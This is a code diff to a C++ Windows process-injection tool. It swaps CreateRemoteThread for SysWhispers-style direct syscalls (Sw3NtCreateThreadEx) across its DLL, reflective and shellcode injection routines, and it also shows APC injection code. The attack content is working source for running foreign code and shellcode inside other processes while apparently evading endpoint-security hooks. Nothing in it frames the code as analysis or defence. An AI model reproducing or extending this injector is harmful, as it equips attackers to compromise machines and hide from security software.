@@ -1,5 +1,6 @@
 #include "Injector.h"
 #include "Helper.h"
+#include "S-Wisper.h"
 #include <Windows.h>
 #include <tlhelp32.h>
 
@@ -45,8 +46,6 @@ DWORD Injector::GetPidName(char name[]) {
     size_t outSize;
     mbstowcs_s(&outSize, wideCharStr, size, name, size - 1);
 
-
-    // 获取进程快照
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
 #ifdef _DEBUG
@@ -59,7 +58,6 @@ DWORD Injector::GetPidName(char name[]) {
     processEntry.dwSize = sizeof(PROCESSENTRY32);
     HANDLE hProcess = NULL;
     BOOL bWow64 = FALSE;
-    // 获取第一个进程信息
     if (Process32First(hSnapshot, &processEntry)) {
         do {
             if (wcsstr(processEntry.szExeFile, wideCharStr) != nullptr) {
@@ -79,7 +77,6 @@ DWORD Injector::GetPidName(char name[]) {
         return 0;
     }
 
-    // 关闭句柄
     CloseHandle(hSnapshot);
     return pid;
 }
@@ -91,7 +88,6 @@ void Injector::RemoteThreadInject(DWORD pid) {
         return;
     if (!this->exist)
         return;
-    //向目标进程写入DLL的路径
     if (!this->bInjectable(pid))
         return;
     SIZE_T dwWriteSize = 0;
@@ -114,7 +110,6 @@ void Injector::RemoteThreadInject(DWORD pid) {
         return;
     }
 
-    //从ntdll导出 LoadLibraryA 函数
     HMODULE Ntdll = LoadLibraryA("kernel32.dll");
     if (Ntdll <= 0) {
 #ifdef _DEBUG
@@ -135,8 +130,11 @@ void Injector::RemoteThreadInject(DWORD pid) {
         return;
     }
 
-    HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
-    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == 0) {
+    //HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
+    HANDLE hRemoteProcess = NULL;
+#ifdef _WIN64
+    NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, FALSE, NULL, NULL, NULL, NULL);
+    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS) {
 #ifdef _DEBUG
         cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
 #endif // _DEBUG
@@ -144,10 +142,25 @@ void Injector::RemoteThreadInject(DWORD pid) {
         CloseHandle(hProcess);
         FreeModule(Ntdll);
         return;
-    }
+}
+#else
+#ifdef _WIN32
+        hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
+        if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL) {
+#ifdef _DEBUG
+            cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
+#endif // _DEBUG
+            VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
+            CloseHandle(hProcess);
+            FreeModule(Ntdll);
+            return;
+        }
+#endif // _WIN32
+#endif // _WIN64
+
 
     WaitForSingleObject(hRemoteProcess, 500);
-    //释放资源
+
     VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
     CloseHandle(hProcess);
     FreeModule(Ntdll);
@@ -190,11 +203,31 @@ void Injector::unInject(DWORD pid) {
         return;
     }
 
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
-    if (hThread != INVALID_HANDLE_VALUE && hThread != 0) {
-        WaitForSingleObject(hThread, INFINITE);
+    //HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
+    HANDLE hThread = NULL;
+#ifdef _WIN64
+    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)hFreeLib, result.modBaseAddr, FALSE, NULL, NULL, NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
+#ifdef _DEBUG
+        cerr << "[!] Free Remote Library Failed!: " << GetLastError() << endl;;
+#endif // _DEBUG
+        CloseHandle(hProcess);
+        return;
     }
+#else
+#ifdef _WIN32
+    hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
+#ifdef _DEBUG
+        cerr << "[!] Free Remote Library Failed!: " << GetLastError() << endl;;
+#endif // _DEBUG
+        CloseHandle(hProcess);
+        return;
+    }
+#endif // _WIN32
+#endif // _WIN64
 
+    WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hProcess);
     FreeModule(hModule);
     //CloseHandle(hFreeLib);
@@ -206,9 +239,6 @@ void Injector::ReflectInject(DWORD pid) {
     if (pid == 0)
         return;
 
-    //其实应该有两种模式
-    //     从网络加载和本地加载
-    //TODO: 从网络加载
     if (!this->exist)
         return;
     HANDLE hFile = CreateFileA(this->DllPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -276,8 +306,11 @@ void Injector::ReflectInject(DWORD pid) {
     bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &dwWriteSize);
     LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset);
 
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
-    if (hThread == INVALID_HANDLE_VALUE || hThread == 0) {
+    //HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
+    HANDLE hThread = NULL;
+#ifdef _WIN64
+    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpReflectiveLoader, pBase, FALSE, NULL, NULL, NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
 #ifdef _DEBUG
         cerr << "[!] Create Thread Failed: " << GetLastError() << endl;
 #endif // _DEBUG
@@ -287,6 +320,23 @@ void Injector::ReflectInject(DWORD pid) {
         CloseHandle(hProcess);
         return;
     }
+#else
+#ifdef _WIN32
+    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
+#ifdef _DEBUG
+        cerr << "[!] Create Thread Failed: " << GetLastError() << endl;
+#endif // _DEBUG
+        delete[] buffer;
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return;
+    }
+#endif // _WIN32
+
+#endif // _WIN64
+
 
     WaitForSingleObject(hThread, 500);
 
@@ -307,7 +357,7 @@ void Injector::ApcInject(DWORD pid) {
         return;
     if (!this->exist)
         return;
-    //向目标进程写入DLL的路径
+    
     if (!this->bInjectable(pid))
         return;
     SIZE_T dwWriteSize = 0;
@@ -411,7 +461,7 @@ void Injector::Injectable() {
     processEntry.dwSize = sizeof(PROCESSENTRY32);
     HANDLE hProcess = NULL;
     BOOL bWow64 = FALSE;
-    // 获取第一个进程信息
+
     if (Process32First(hSnapshot, &processEntry)) {
         do {
             if (this->bInjectable(processEntry.th32ProcessID)) {
@@ -463,7 +513,6 @@ void Injector::Injectable() {
         ;
     }
 
-    // 关闭句柄
     CloseHandle(hSnapshot);
 }
 
@@ -493,8 +542,11 @@ void Injector::ShellcodeInject(string basedsc, DWORD pid) {
         return;
     }
 
-    HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
-    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == 0) {
+    //HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+    HANDLE hRemoteProcess = NULL;
+#ifdef _WIN64
+    NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS) {
 #ifdef _DEBUG
         cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
 #endif // _DEBUG
@@ -502,6 +554,20 @@ void Injector::ShellcodeInject(string basedsc, DWORD pid) {
         CloseHandle(hProcess);
         return;
     }
+#else
+#ifdef _WIN32
+    hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL) {
+#ifdef _DEBUG
+        cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
+#endif // _DEBUG
+        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
+        CloseHandle(hProcess);
+        return;
+    }
+#endif // _WIN32
+
+#endif // _WIN64
 
     WaitForSingleObject(hRemoteProcess, INFINITE);
     VirtualFreeEx(hProcess, pAddress, shellcode.size() + 1, MEM_COMMIT);
@@ -549,7 +615,6 @@ void Injector::ApcShellcodeInject(string basedsc, DWORD pid) {
     BOOL bStat = FALSE;
     HANDLE hThread = NULL;
 
-    //得到第一个线程
     if (Thread32First(hThreadSnap, &te)) {
         do
         {
